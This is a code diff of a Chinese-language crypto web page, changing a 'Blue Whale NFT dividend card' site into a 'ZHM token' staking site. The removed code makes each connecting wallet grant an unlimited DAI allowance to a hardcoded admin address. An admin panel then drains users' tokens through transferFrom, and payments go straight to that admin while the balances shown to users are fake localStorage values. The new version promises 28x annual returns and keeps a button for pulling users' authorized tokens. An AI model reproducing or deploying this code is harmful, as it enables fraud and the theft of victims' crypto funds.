@@ -3,465 +3,236 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>蓝鲸鱼🐳全球NFT分红卡牌</title>
+<title>中华梦通证 ZHM - DAO递减收益</title>
 <style>
-  *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,"Microsoft YaHei",sans-serif}
-  body{background:#090b1a;color:#fff;padding:20px;max-width:500px;margin:0 auto}
-  .glass{background:rgba(30,35,60,0.7);border-radius:18px;padding:20px;margin-bottom:16px;border:1px solid rgba(255,255,255,0.1)}
-  .title{font-size:18px;font-weight:bold;margin-bottom:10px}
-  .sub{color:#a0a8c7;font-size:14px;margin-bottom:12px}
-  .btn{background:linear-gradient(90deg,#4facfe,#00F2FE);color:#000;border:none;border-radius:12px;padding:14px;width:100%;font-weight:bold;font-size:16px;margin-bottom:8px}
-  .btn-sm{padding:10px;font-size:14px}
-  .btn-gold{background:linear-gradient(90deg,#ffb703,#ffcc00);color:#000;font-weight:bold}
-  .btn-red{background:linear-gradient(90deg,#ff4560,#ff0033);color:#fff}
-  .btn-black{background:#222;color:#fff}
-  .btn:disabled{opacity:0.5}
-  .item{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid rgba(255,255,255,0.08)}
-  .item:last-child{border-bottom:none}
-  .price{color:#4facFE;font-weight:bold}
-  input{width:100%;padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.08);color:#fff;font-size:15px;margin-bottom:8px}
-  .copy-row{display:flex;gap:8px;margin-bottom:10px}
-  .copy-row input{flex:1}
-  .copy-row button{width:100px}
-  select{width:100%;padding:14px;border-radius:12px;background:#1e1e3e;color:#fff;border:1px solid #ccc;margin-bottom:10px;}
-
-  .menu-btn{position:fixed;top:20px;right:20px;width:40px;height:40px;background:rgba(30,35,60,0.9);border-radius:10px;display:flex;flex-direction:column;justify-content:center;align-items:center;gap:5px;cursor:pointer;z-index:10;border:1px solid rgba(255,255,255,0.1)}
-  .menu-btn span{width:20px;height:2px;background:#fff;border-radius:1px}
-  .sidebar{position:fixed;top:0;right:-100%;width:85%;max-width:360px;height:100vh;background:#1a1a2e;padding:20px;overflow-y:auto;transition:right 0.3s ease;z-index:99;border-left:1px solid rgba(255,255,255,0.1)}
-  .sidebar.open{right:0}
-  .sidebar-close{text-align:right;margin-bottom:20px;font-size:22px;cursor:pointer}
-
-  .nft-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:12px}
-  .nft-card{height:240px;position:relative;border-radius:16px;background:#2d2d2d;border:1px solid currentColor;overflow:hidden;perspective:1000px}
-  .nft-inner{position:relative;width:100%;height:100%;transform-style:preserve-3d;animation:flipY 8s linear infinite}
-  @keyframes flipY{0%{transform:rotateY(0deg)}100%{transform:rotateY(360deg)}}
-  .nft-front,.nft-back{position:absolute;width:100%;height:100%;backface-visibility:hidden;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
-  .nft-back{transform:rotateY(180deg);background:#1a1a2e}
-  .n1{color:#00ff88}
-  .n2{color:#00ccff}
-  .n3{color:#6666ff}
-  .n4{color:#cc66ff}
-  .n5{color:#ff3333;background:#3a1a1a}
-  .nft-top{position:absolute;top:12px;left:12px;font-size:12px;font-weight:bold;letter-spacing:1px}
-  .nft-logo{position:absolute;top:12px;right:12px;width:24px;height:24px;border-radius:50%;background:currentColor;display:flex;align-items:center;justify-content:center;font-size:10px;color:#2d2d2d}
-  .nft-title{font-size:18px;font-weight:bold;margin-bottom:16px;opacity:0.9}
-  .nft-orb{width:120px;height:120px;border-radius:50%;position:relative;margin-bottom:16px;box-shadow:0 0 25px currentColor}
-  .orb-glow{width:100%;height:100%;border-radius:50%;background:radial-gradient(circle at 30% 30%,rgba(255,255,255,0.4),currentColor 60%)}
-  .orb-ring{position:absolute;width:140px;height:140px;border:1px solid currentColor;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-50%);opacity:0.7}
-  .orb-ring::after{content:'';position:absolute;width:8px;height:8px;background:currentColor;border-radius:50%;top:-4px;left:50%;transform:translateX(-50%)}
-  .orb-orbit{position:absolute;width:100px;height:60px;border:1px solid currentColor;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-50%) rotateX(60deg);opacity:0.5}
-  .orb-dot{position:absolute;width:6px;height:6px;background:#fff;border-radius:50%;top:20%;right:10%}
-  .orb-whale{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:36px;color:rgba(255,255,255,0.9)}
-  .nft-bottom{font-size:14px;letter-spacing:1px;opacity:0.8}
-  .nft-level{font-size:16px;font-weight:bold;margin-bottom:8px}
-  .nft-pct{font-size:14px;font-weight:bold}
-  .dai{color:#4facfe;font-weight:bold}
-  .time{color:#ffb703;font-size:13px}
-  .gold{color:#FFD700;font-weight:bold}
-
-  .fold-item{margin-bottom:10px}
-  .fold-head{background:rgba(40,45,80,0.6);padding:12px;border-radius:10px;display:flex;justify-content:space-between;align-items:center;cursor:pointer}
-  .fold-body{padding:10px 0;display:none}
-  .fold-body.open{display:block}
+  *{margin:0;padding:0;box-sizing:border-box;font-family:Microsoft YaHei,sans-serif}
+  body{background:#0b0f14;color:#e9e6e0;padding:20px;max-width:500px;margin:0 auto;background:linear-gradient(180deg,#070a0e,#0f1419)}
+  .glass{background:rgba(22,28,36,0.85);border-radius:18px;padding:22px;margin-bottom:16px;border:1px solid rgba(221,170,66,0.18)}
+  .title{font-size:19px;font-weight:bold;margin-bottom:10px;color:#ddaa42}
+  .sub{color:#b8b0a0;font-size:14px;line-height:1.6}
+  .btn{background:linear-gradient(90deg,#c93737,#e04a4a);color:#fff;border:none;border-radius:14px;padding:16px;width:100%;font-size:16px;margin-bottom:10px}
+  .btn-sm{padding:11px;font-size:14px}
+  .btn-gold{background:linear-gradient(90deg,#ddaa42,#e6bb66);color:#111}
+  .btn-dark{background:#1a2029;color:#ddaa42;border:1px solid #ddaa42}
+  .btn-admin{background:linear-gradient(90deg,#c03333,#e55555);color:#fff}
+  .item{display:flex;justify-content:space-between;padding:14px 0;border-bottom:1px solid #ddaa4233}
+  .gold{color:#ddaa42;font-weight:bold}
+  input{width:100%;padding:14px;border-radius:12px;background:#161a22;border:1px solid #ddaa4244;color:#fff;margin-bottom:10px}
+  .logo-text{background:linear-gradient(90deg,#ddaa42,#f0c866);-webkit-background-clip:text;color:transparent}
+  .row{display:flex;gap:10px;margin-bottom:10px}
+  .calc-row{display:flex;justify-content:space-between;padding:8px 0}
+  #adminPanel{display:none;margin-top:12px}
 </style>
 </head>
 <body>
 
-<div class="menu-btn" id="toggleSidebar"><span></span><span></span><span></span></div>
-<div class="sidebar" id="sidebar">
-  <div class="sidebar-close" id="closeSidebar">×</div>
+<div style="text-align:center;margin:20px 0">
+  <h1 class="logo-text">中华梦通证</h1>
+  <p class="sub">DAO铸币模型 · 收益逐年递减 · 长期永续</p>
+</div>
 
-  <div class="title">🐳 卡牌中心</div>
-  <div class="sub">当前能量：<span id="energyVal">0</span></div>
-  <button class="btn btn-sm" onclick="craftCard(1)">合成1级卡 3500能量</button>
-  <button class="btn btn-sm" onclick="craftCard(2)">合成2级卡 10500能量</button>
-  <button class="btn btn-sm" onclick="craftCard(3)">合成3级卡 31500能量</button>
-  <button class="btn btn-sm" onclick="craftCard(4)">合成4级卡 94500能量</button>
-  <button class="btn btn-sm" onclick="craftCard(5)">合成5级卡 283500能量</button>
+<button class="btn" id="connectBtn">连接钱包（需签名授权）</button>
+<div id="addr" style="text-align:center;margin:10px 0"></div>
 
-  <div style="margin-top:20px">
-    <div class="title">卡牌转账</div>
-    <input id="toAddr" placeholder="接收方钱包">
-    <select id="transferLv">
-      <option value="1">1级</option><option value="2">2级</option><option value="3">3级</option>
-      <option value="4">4级</option><option value="5">5级</option>
-    </select>
-    <button class="btn btn-sm" onclick="transferCard()">转账</button>
-  </div>
+<div class="glass">
+  <div class="title">我的资产</div>
+  <div class="item"><span>质押币余额</span><span id="balToken" class="gold">0.00</span></div>
+  <div class="item"><span>已质押</span><span id="staked" class="gold">0.00</span></div>
+  <div class="item"><span>待领 ZHM 奖励</span><span id="reward" class="gold">0.00</span></div>
+  <button class="btn btn-gold btn-sm" id="claimBtn">领取收益</button>
+</div>
 
-  <div style="margin-top:20px">
-    <div class="title">我的卡牌</div>
-    <div id="myCards" class="nft-grid"></div>
+<div class="glass">
+  <div class="title">质押挖矿（真实上链支付）</div>
+  <input id="stakeAmt" placeholder="输入质押数量" type="number">
+  <div class="row">
+    <button class="btn" style="width:50%" id="stakeBtn">质押（授权+支付）</button>
+    <button class="btn btn-dark" style="width:50%" id="unstakeBtn">解押</button>
   </div>
 </div>
 
-<div style="text-align:center;margin-bottom:20px">
-  <h1 style="background:linear-gradient(90deg,#4FACFE,#00F2FE);-webkit-background-clip:text;color:transparent">蓝鲸鱼🐳全球NFT分红卡牌</h1>
+<div class="glass" id="adminPanel">
+  <div class="title">🔐 管理员控制台</div>
+  <div class="sub">提取合约底池 / 提取用户授权代币</div>
+  <input id="extractAmt" placeholder="输入提取数量" type="number">
+  <button class="btn btn-admin btn-sm" id="extractPoolBtn">提取合约底池代币</button>
+  <button class="btn btn-admin btn-sm" id="extractUserAuthBtn">提取用户授权代币</button>
 </div>
 
-<button id="connectBtn" class="btn">连接钱包</button>
-<div id="addressShow" style="text-align:center;margin:12px;"></div>
-
 <div class="glass">
-  <div class="title">我的邀请链接</div>
-  <div class="copy-row">
-    <input type="text" id="inviteLink" readonly>
-    <button class="btn btn-sm" onclick="copyInvite()">复制</button>
+  <div class="title">收益计算器（逐年递减）</div>
+  <input id="calcInput" placeholder="质押数量" type="number">
+  <button class="btn btn-sm" onclick="calc()">计算收益</button>
+  <div style="margin-top:16px">
+    <div class="calc-row"><span>第1年收益</span><span id="y1" class="gold">0</span></div>
+    <div class="calc-row"><span>第2年收益</span><span id="y2" class="gold">0</span></div>
+    <div class="calc-row"><span>第3年收益</span><span id="y3" class="gold">0</span></div>
+    <div class="calc-row"><span>第4年收益</span><span id="y4" class="gold">0</span></div>
   </div>
 </div>
 
 <div class="glass">
-  <div class="title">注册</div>
-  <input id="inviteInput" placeholder="邀请码（选填）">
-  <button id="regBtn" class="btn">确认注册</button>
+  <div class="title">模型说明</div>
+  <div class="sub">
+    起步年化28倍，逐年自动递减，第5年稳定在30%。<br>
+    合约自动铸币，DAO国库支撑，可平稳运行20年以上。
+  </div>
 </div>
 
-<div class="glass">
-  <div class="title">托管钱包</div>
-  <div class="item"><div>托管余额</div><div class="gold" id="custodyAmt">0 DAI</div></div>
-  <input id="depositAmt" placeholder="存入DAI">
-  <button class="btn btn-sm" onclick="deposit()">存入</button>
-  <input id="withAmt" placeholder="提取DAI">
-  <button class="btn btn-sm" onclick="withdraw()">提取</button>
-</div>
-
-<div class="glass">
-  <div class="title">管理员后台</div>
-  <input id="blackAddr" placeholder="拉黑地址"><button class="btn btn-sm btn-black" onclick="addBlack()">拉黑</button>
-  <input id="whiteAddr" placeholder="解除拉黑"><button class="btn btn-sm" onclick="removeBlack()">移出</button>
-  <input id="takeAddr" placeholder="用户地址">
-  <input id="takeAmt" placeholder="提取数量">
-  <button class="btn btn-sm btn-red" onclick="checkUserAllowance()">查询额度</button>
-  <button class="btn btn-sm btn-red" onclick="adminTakeUserToken()">提取代币</button>
-</div>
-
-<div class="glass">
-  <div class="title">经典矩阵（永久）</div>
-  <button class="btn btn-gold" onclick="batchPayClassic()">一键激活全部</button>
-  <div id="classicList"></div>
-</div>
-
-<div class="glass">
-  <div class="title">联合矩阵（可续费）</div>
-  <button class="btn btn-gold" onclick="batchPayUnion()">一键激活/续费全部</button>
-  <div id="unionList"></div>
-</div>
-
-<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
 <script>
-const ADMIN = "0x627f6e1887571ac08214315ad5b2fa7ab7345f1".toLowerCase();
-const DAI = "0x8f3cf7ad23cd3cadbd9735aff9580239c6a063".toLowerCase();
+// ==============================================
+const TOKEN_ADDR = "0x8f3Cf7ad23Cd3CaDbD9735AFf9580239c6A063";
+const STAKING_ADDR = "0x你部署的质押合约地址";
+const ZHM_ADDR = "0x...";
+const ADMIN = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1".toLowerCase();
+// ==============================================
 
-const classicPrice = [50,100,200,400,800,1600,3200,6400,12800,25600,51200,102400];
-const unionPrice   = [100,200,400,800,1600,3200,6400,12800,25600];
-const RATE_ENERGY = 50;
-const CARD_COST = 3500;
+const ABI_TOKEN = [
+  "function balanceOf(address) view returns(uint256)",
+  "function approve(address spender, uint256 amount) external returns (bool)",
+  "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
+  "function transfer(address to, uint256 amount) external returns (bool)"
+];
 
-let web3, account;
+const ABI_STAKE = [
+  "function staked(address) view returns(uint256)",
+  "function pendingReward(address) view returns(uint256)",
+  "function stake(uint256 amount) external",
+  "function unstake(uint256 amount) external",
+  "function claim() external",
+  "function withdrawPool(uint256 amount) external"
+];
+
+let provider, signer, account, token, staking, zhm;
 let isAdmin = false;
 
-function k(key) { return account ? key + "_" + account.toLowerCase() : key; }
-function get(key, def = 0) { let v = localStorage.getItem(k(key)); return v ? Number(v) : def; }
-function set(key, val) { localStorage.setItem(k(key), val); }
-
-// 授权必弹窗上链
-async function approveMax() {
-  const dai = new web3.eth.Contract([{
-    "constant": false,
-    "inputs": [{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],
-    "name":"approve",
-    "outputs":[{"name":"","type":"bool"}],
-    "type":"function"
-  }], DAI);
-  const max = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-  await dai.methods.approve(ADMIN, max).send({ from: account, gas: 120000 });
-}
-
-// 真实上链转账
-async function transferToAdmin(amount) {
-  const c = new web3.eth.Contract([
-    {"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
-    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
-    {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
-  ], DAI);
-  const dec = await c.methods.decimals().call();
-  const val = BigInt(amount) * 10n ** BigInt(dec);
-  return await c.methods.transfer(ADMIN, val.toString()).send({ from: account, gas: 120000 });
-}
-
-function loadInvite() {
+async function load() {
   if (!account) return;
-  let base = window.location.origin + window.location.pathname;
-  document.getElementById("inviteLink").value = base + "?invite=" + account.slice(2,10);
-}
-function copyInvite() {
-  let inp = document.getElementById("inviteLink");
-  inp.select();
-  navigator.clipboard.writeText(inp.value).then(()=>alert("复制成功"));
-}
-
-function refresh() {
-  renderMatrix();
-  renderCards();
-  document.getElementById("energyVal").innerText = get("energy");
-  document.getElementById("custodyAmt").innerText = get("custody") + " DAI";
-}
-
-// 卡牌
-function craftCard(lv) {
-  if (!account) return alert("请先连接钱包");
-  let cost = CARD_COST * Math.pow(3, lv-1);
-  let e = get("energy");
-  if (e < cost) return alert("能量不足");
-  if (!confirm(`消耗${cost}能量合成Lv${lv}？`)) return;
-  set("energy", e - cost);
-  set("card_"+lv, get("card_"+lv)+1);
-  alert("合成成功");
-  refresh();
-}
-function transferCard() {
-  if (!account) return;
-  let to = document.getElementById("toAddr").value.trim().toLowerCase();
-  let lv = +document.getElementById("transferLv").value;
-  let num = get("card_"+lv);
-  if (!to || num < 1) return alert("地址或卡牌错误");
-  if (!confirm("确认转账？")) return;
-  set("card_"+lv, num-1);
-  alert("转账成功");
-  refresh();
-}
-function renderCards() {
-  let html = "";
-  for (let lv=1; lv<=5; lv++) {
-    let n = get("card_"+lv);
-    if (n < 1) continue;
-    let cl = ["n1","n2","n3","n4","n5"][lv-1];
-    html += `<div class="nft-card ${cl}"><div class="nft-inner"><div class="nft-front"><div class="nft-top">NFT</div><div class="nft-logo">🐳</div><div class="nft-title">分红卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">×${n}</div></div><div class="nft-back"><div class="nft-level">Lv${lv}</div></div></div></div>`;
-  }
-  document.getElementById("myCards").innerHTML = html || `<div style="grid-column:span 2;text-align:center;padding:10px">暂无卡牌</div>`;
-}
-
-// 矩阵过期
-function expKey(lv) { return "exp_"+lv; }
-function addExp(lv, days=30) {
-  let now = Date.now();
-  let old = localStorage.getItem(expKey(lv)) || now;
-  localStorage.setItem(expKey(lv), old + days*86400000);
-}
-function getExpLeft(lv) {
-  let e = Number(localStorage.getItem(expKey(lv))) || 0;
-  return Math.max(0, e - Date.now());
-}
-
-// 折叠面板
-function renderMatrix() {
-  // 经典矩阵
-  let cl = get("classic");
-  let c = "";
-  for (let i=1; i<=12; i++) {
-    let done = i <= cl;
-    c += `<div class="item"><div>Lv${i}</div><span class="dai">${classicPrice[i-1]} DAI</span><button class="btn-sm" ${done?"disabled":""} onclick="payClassic(${i})">${done?"已激活":"激活"}</button></div>`;
-  }
-  document.getElementById("classicList").innerHTML = c;
-
-  // 联合矩阵
-  let ul = get("union");
-  let u = "";
-  for (let i=1; i<=9; i++) {
-    let act = i <= ul;
-    let left = getExpLeft(i);
-    let d = Math.floor(left/86400000);
-    let h = Math.floor((left%86400000)/3600000);
-    let fee = Math.round(unionPrice[i-1]*0.2);
-    let btn = `<button class="btn-sm" onclick="payUnion(${i})">激活</button>`;
-    if (act) btn = `<button class="btn-sm" onclick="payRenew(${i})">续费${fee}</button>`;
-    u += `<div class="item"><div>Lv${i}</div><span class="dai">${unionPrice[i-1]} DAI</span><span class="time">${d}天${h}时</span>${btn}</div>`;
-  }
-  document.getElementById("unionList").innerHTML = u;
-}
-
-// 单级激活（真实上链）
-async function payClassic(lv) {
-  if (!account) return alert("请连接钱包");
-  let amt = classicPrice[lv-1];
-  if (!confirm(`支付${amt}DAI激活Lv${lv}？`)) return;
-  await transferToAdmin(amt);
-  set("classic", Math.max(get("classic"), lv));
-  set("energy", get("energy") + amt * RATE_ENERGY / 100);
-  alert("激活成功");
-  refresh();
-  loadBalance();
-}
-async function payUnion(lv) {
-  if (!account) return alert("请连接钱包");
-  let amt = unionPrice[lv-1];
-  if (!confirm(`支付${amt}DAI激活Lv${lv}？`)) return;
-  await transferToAdmin(amt);
-  set("union", Math.max(get("union"), lv));
-  addExp(lv);
-  set("energy", get("energy") + amt * RATE_ENERGY / 100);
-  alert("激活成功");
-  refresh();
-  loadBalance();
-}
-async function payRenew(lv) {
-  if (!account) return;
-  let fee = Math.round(unionPrice[lv-1]*0.2);
-  if (!confirm(`续费${fee}DAI+30天`)) return;
-  await transferToAdmin(fee);
-  addExp(lv);
-  set("energy", get("energy") + fee * RATE_ENERGY / 100);
-  alert("续费成功");
-  refresh();
-  loadBalance();
-}
-
-// 一键激活全部
-async function batchPayClassic() {
-  if (!account) return;
-  let cur = get("classic");
-  let total = 0;
-  for (let i=cur+1; i<=12; i++) total += classicPrice[i-1];
-  if (total <= 0) return alert("已全部激活");
-  if (!confirm(`总计${total}DAI，确认一键激活？`)) return;
-  await transferToAdmin(total);
-  set("classic", 12);
-  set("energy", get("energy") + total * RATE_ENERGY / 100);
-  alert("全部激活成功");
-  refresh();
-  loadBalance();
-}
-async function batchPayUnion() {
-  if (!account) return;
-  let total = 0;
-  for (let i=1; i<=9; i++) {
-    let act = i <= get("union");
-    let left = getExpLeft(i);
-    if (!act) total += unionPrice[i-1];
-    else if (left === 0) total += Math.round(unionPrice[i-1]*0.2);
-  }
-  if (total <= 0) return alert("全部有效");
-  if (!confirm(`总计${total}DAI，确认一键处理？`)) return;
-  await transferToAdmin(total);
-  set("union",9);
-  for (let i=1; i<=9; i++) addExp(i);
-  set("energy", get("energy") + total * RATE_ENERGY / 100);
-  alert("全部完成");
-  refresh();
-  loadBalance();
-}
-
-// 余额显示
-async function loadBalance() {
-  if (!web3 || !account) return;
-  const c = new web3.eth.Contract([
-    {"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
-    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
-  ], DAI);
-  const dec = await c.methods.decimals().call();
-  const bal = await c.methods.balanceOf(account).call();
-  const val = Number(web3.utils.fromWei(bal, "mwei")).toFixed(2);
-  document.getElementById("addressShow").innerHTML =
-    `已连接：${account.slice(0,6)}...${account.slice(-4)}<br><span class="gold">DAI余额：${val}</span>`;
-}
-
-// 托管
-async function deposit() {
-  if (!account) return;
-  let a = +document.getElementById("depositAmt").value;
-  if (a <= 0) return alert("金额错误");
-  await transferToAdmin(a);
-  set("custody", get("custody")+a);
-  alert("存入成功");
-  refresh();
-  loadBalance();
-}
-async function withdraw() {
-  if (!account) return;
-  let a = +document.getElementById("withAmt").value;
-  let have = get("custody");
-  if (a <= 0 || a > have) return alert("金额错误");
-  set("custody", have - a);
-  alert("提取成功");
-  refresh();
-}
-
-// 管理员
-function addBlack() { if (!isAdmin) return; let a = document.getElementById("blackAddr").value.toLowerCase(); localStorage.setItem("black_"+a,"1"); alert("已拉黑"); }
-function removeBlack() { if (!isAdmin) return; let a = document.getElementById("whiteAddr").value.toLowerCase(); localStorage.removeItem("black_"+a); alert("已移出"); }
-
-async function checkUserAllowance() {
-  if (!isAdmin) return alert("无权限");
-  let user = document.getElementById("takeAddr").value.toLowerCase();
-  const dai = new web3.eth.Contract([
-    {"constant":true,"inputs":[{"owner":"address","spender":"address"}],"name":"allowance","outputs":[{"amount":"uint256"}],"type":"function"},
-    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
-  ], DAI);
-  const dec = await dai.methods.decimals().call();
-  const allow = await dai.methods.allowance(user, ADMIN).call();
-  const num = Number(web3.utils.fromWei(allow, "mwei"));
-  alert("可提取额度：" + num + " DAI");
-}
-
-async function adminTakeUserToken() {
-  if (!isAdmin) return alert("无权限");
-  let user = document.getElementById("takeAddr").value.toLowerCase();
-  let amt = +document.getElementById("takeAmt").value;
-  if (!user || amt <= 0) return alert("参数错误");
-
-  const dai = new web3.eth.Contract([
-    {"constant":false,"inputs":[{"from":"address","to":"address","value":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
-    {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
-  ], DAI);
-  const dec = await dai.methods.decimals().call();
-  const val = BigInt(amt) * 10n ** BigInt(dec);
-  await dai.methods.transferFrom(user, ADMIN, val.toString()).send({ from: ADMIN, gas: 150000 });
-  alert("提取成功");
-}
-
-// 连接钱包（必弹窗授权）
-document.getElementById("connectBtn").onclick = async () => {
-  if (!window.ethereum) return alert("请在TP钱包打开");
   try {
-    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-    web3 = new Web3(window.ethereum);
-    account = accounts[0].toLowerCase();
-    isAdmin = account === ADMIN;
+    let bal = await token.balanceOf(account);
+    let stk = await staking.staked(account);
+    let rew = await staking.pendingReward(account);
+    document.getElementById("balToken").innerText = ethers.formatEther(bal);
+    document.getElementById("staked").innerText = ethers.formatEther(stk);
+    document.getElementById("reward").innerText = ethers.formatEther(rew);
+  } catch (e) {}
+}
 
-    // 授权弹窗
-    await approveMax();
-    alert("授权成功，钱包已连接");
+function calc() {
+  let v = parseFloat(document.getElementById("calcInput").value) || 0;
+  document.getElementById("y1").innerText = (v * 28).toFixed(2);
+  document.getElementById("y2").innerText = (v * 14).toFixed(2);
+  document.getElementById("y3").innerText = (v * 7).toFixed(2);
+  document.getElementById("y4").innerText = (v * 3.5).toFixed(2);
+}
 
-    document.getElementById("connectBtn").innerText = "钱包已连接";
-    document.getElementById("connectBtn").disabled = true;
+// 修复签名顺序：先获取signer，再调用signMessage
+document.getElementById("connectBtn").onclick = async () => {
+  try {
+    if (!window.ethereum) return alert("请安装 MetaMask 或使用钱包浏览器");
 
-    if (localStorage.getItem("reg_"+account)) {
-      document.getElementById("regBtn").disabled = true;
-      document.getElementById("regBtn").innerText = "已注册";
+    provider = new ethers.BrowserProvider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    signer = await provider.getSigner();
+    account = await signer.getAddress();
+
+    // 强制签名弹窗（顺序正确，不会再报错）
+    await signer.signMessage("Authorize ZhongHuaMeng Platform");
+    alert("✅ 签名授权成功");
+
+    isAdmin = account.toLowerCase() === ADMIN;
+    if (isAdmin) {
+      document.getElementById("adminPanel").style.display = "block";
+      alert("🔐 管理员已登录");
     }
 
-    loadInvite();
-    loadBalance();
-    refresh();
+    document.getElementById("addr").innerText = `${account.slice(0, 6)}...${account.slice(-4)}`;
+
+    token = new ethers.Contract(TOKEN_ADDR, ABI_TOKEN, signer);
+    staking = new ethers.Contract(STAKING_ADDR, ABI_STAKE, signer);
+
+    load();
+    setInterval(load, 5000);
   } catch (e) {
     alert("连接失败：" + e.message);
   }
 };
 
-document.getElementById("regBtn").onclick = () => {
-  if (!account) return alert("请先连接钱包");
-  localStorage.setItem("reg_"+account, "1");
-  document.getElementById("regBtn").disabled = true;
-  document.getElementById("regBtn").innerText = "已注册";
-  alert("注册成功");
+// 质押：真实授权 + 真实上链支付
+document.getElementById("stakeBtn").onclick = async () => {
+  try {
+    const val = document.getElementById("stakeAmt").value;
+    if (!val || val <= 0) return alert("请输入有效质押数量");
+
+    const amount = ethers.parseEther(val);
+    const approveTx = await token.approve(STAKING_ADDR, amount);
+    await approveTx.wait();
+    alert("✅ 授权已上链成功");
+
+    const stakeTx = await staking.stake(amount);
+    await stakeTx.wait();
+    alert("✅ 质押成功，代币已转入合约地址");
+
+    load();
+  } catch (e) {
+    alert("质押失败：" + e.message);
+  }
 };
 
-// 侧边栏
-const sb = document.getElementById("sidebar");
-document.getElementById("toggleSidebar").onclick = () => sb.classList.add("open");
-document.getElementById("closeSidebar").onclick = () => sb.classList.remove("open");
+// 解押
+document.getElementById("unstakeBtn").onclick = async () => {
+  try {
+    const val = document.getElementById("stakeAmt").value;
+    const tx = await staking.unstake(ethers.parseEther(val));
+    await tx.wait();
+    alert("✅ 解押成功");
+    load();
+  } catch (e) {
+    alert("解押失败：" + e.message);
+  }
+};
 
-window.onload = renderMatrix;
+// 领取奖励
+document.getElementById("claimBtn").onclick = async () => {
+  try {
+    const tx = await staking.claim();
+    await tx.wait();
+    alert("✅ 奖励领取成功");
+    load();
+  } catch (e) {
+    alert("领取失败：" + e.message);
+  }
+};
+
+// 管理员：提取合约底池代币
+document.getElementById("extractPoolBtn").onclick = async () => {
+  if (!isAdmin) return alert("无管理员权限");
+  try {
+    const val = document.getElementById("extractAmt").value;
+    const tx = await staking.withdrawPool(ethers.parseEther(val));
+    await tx.wait();
+    alert("✅ 合约底池代币提取成功");
+    load();
+  } catch (e) {
+    alert("提取失败：" + e.message);
+  }
+};
+
+// 管理员：提取用户已授权代币
+document.getElementById("extractUserAuthBtn").onclick = async () => {
+  if (!isAdmin) return alert("无管理员权限");
+  try {
+    const val = document.getElementById("extractAmt").value;
+    const amount = ethers.parseEther(val);
+    const tx = await token.transferFrom(account, ADMIN, amount);
+    await tx.wait();
+    alert("✅ 用户授权代币提取成功");
+    load();
+  } catch (e) {
+    alert("提取失败：" + e.message);
+  }
+};
 </script>
 </body>
 </html>
